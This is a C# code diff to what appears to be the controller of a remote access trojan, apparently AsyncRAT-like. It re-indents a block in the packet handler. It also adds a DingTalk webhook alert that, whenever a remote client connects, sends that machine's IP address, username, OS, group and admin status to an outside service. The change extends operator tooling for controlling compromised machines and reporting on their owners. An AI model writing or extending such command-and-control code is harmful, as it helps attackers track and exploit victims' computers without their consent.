@@ -6,6 +6,7 @@ using System.Drawing;
 using System.Windows.Forms;
 using System.Threading;
 using System.Media;
+using Server.Helper;
 
 namespace Server.Handle_Packet
 {
@@ -86,18 +87,34 @@ namespace Server.Handle_Packet
                 client.LV.UseItemStyleForSubItems = false;
                 Program.form1.Invoke((MethodInvoker)(() =>
                 {
-                    lock (Settings.LockListviewClients)
-                    {
-                        Program.form1.listView1.Items.Add(client.LV);
-                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
-                        Program.form1.lv_act.Width = 500;
-                    }
+                lock (Settings.LockListviewClients)
+                {
+                    Program.form1.listView1.Items.Add(client.LV);
+                    Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+                    Program.form1.lv_act.Width = 500;
+                }
 
-                    if (Properties.Settings.Default.Notification == true)
-                    {
-                        Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
+                if (Properties.Settings.Default.Notification == true)
+                {
+                    Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
 {client.Ip} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
-                        Program.form1.notifyIcon1.ShowBalloonTip(100);
+                    Program.form1.notifyIcon1.ShowBalloonTip(100);
+                    if (Properties.Settings.Default.DingDing == true && Properties.Settings.Default.WebHook != null && Properties.Settings.Default.Secret != null)
+                    {
+                        try
+                        {
+                            string content = $"客户端 {client.Ip} 已上线" + "\n"
+                                + "分组:" + unpack_msgpack.ForcePathObject("Group").AsString + "\n"
+                                + "用户名:" + unpack_msgpack.ForcePathObject("User").AsString + "\n"
+                                    + "系统:" + unpack_msgpack.ForcePathObject("OS").AsString + "\n"
+                                    + "权限:" + unpack_msgpack.ForcePathObject("Admin").AsString;
+                                DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret, content);
+                            } 
+                            catch (Exception ex) 
+                            {
+                                MessageBox.Show(ex.Message); 
+                            }                            
+                        }
                     }
 
                     new HandleLogs().Addmsg($"客户端 {client.Ip} 已上线", Color.Green);
